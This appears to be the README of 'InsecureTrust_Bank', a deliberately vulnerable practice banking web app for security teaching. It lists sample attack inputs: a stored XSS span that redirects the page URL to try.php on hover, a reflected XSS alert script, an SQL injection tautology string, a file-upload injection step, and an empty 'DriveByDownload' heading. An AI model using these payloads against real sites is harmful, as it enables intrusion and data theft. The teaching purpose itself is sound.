# InsecureTrust_Bank
"InsecureTrust_Bank: Educational repo demonstrating web app vulnerabilities like SQL injection &amp; XSS for security awareness. Use responsibly.



1. S-XSS

        ```<span onmouseover="window.location='try.php?url=' + encodeURIComponent(window.location.href)">Hover over me</span>```

2. R-XSS

        ```<script> alert(123)</script>```

3. SQL Injection

        ```NO' OR '1' = '1'```

4. File Injection

        ```Upload try.php```

5. DriveByDownload

